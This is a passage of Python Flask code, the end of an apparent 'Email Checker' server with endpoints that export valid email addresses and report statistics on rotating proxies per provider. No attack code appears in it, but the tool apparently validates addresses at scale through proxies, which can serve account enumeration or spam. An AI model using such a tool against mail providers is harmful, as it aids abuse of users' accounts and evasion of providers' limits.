            content = '\n'.join(results)
        
        conn.close()
        
        from flask import Response
        return Response(
            content,
            mimetype='text/plain',
            headers={
                'Content-Disposition': f'attachment; filename=valid_emails_{format_type}.txt'
            }
        )
        
    except Exception as e:
        logger.error(f"Error in export_results: {e}")
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/proxy-stats', methods=['GET'])
def get_proxy_stats():
    """Get proxy statistics"""
    try:
        conn = sqlite3.connect('email_checker.db')
        cursor = conn.cursor()
        
        cursor.execute('''
            SELECT proxy_type, COUNT(*) as count, AVG(response_time) as avg_time,
                   SUM(success_count) as total_success, SUM(fail_count) as total_fails
            FROM proxies 
            WHERE is_working = 1
            GROUP BY proxy_type
        ''')
        
        proxy_stats = []
        for row in cursor.fetchall():
            proxy_stats.append({
                'type': row[0],
                'count': row[1],
                'avg_response_time': round(row[2], 3) if row[2] else 0,
                'total_success': row[3],
                'total_fails': row[4]
            })
        
        conn.close()
        
        return jsonify({'success': True, 'proxy_stats': proxy_stats})
        
    except Exception as e:
        logger.error(f"Error in get_proxy_stats: {e}")
        return jsonify({'success': False, 'error': str(e)})

if __name__ == '__main__':
    # Initialize database
    init_db()
    
    # Load environment variables
    port = int(os.environ.get('PORT', 3001))
    host = os.environ.get('HOST', 'localhost')
    debug = os.environ.get('DEBUG', 'False').lower() == 'true'
    
    logger.info(f"Starting Email Checker Server on {host}:{port}")
    logger.info(f"Debug mode: {debug}")
    logger.info(f"Supported providers: {', '.join(EMAIL_PROVIDERS.keys())}")
    
    # Start Flask server with production settings
    app.run(host=host, port=port, debug=debug, threaded=True)
                                                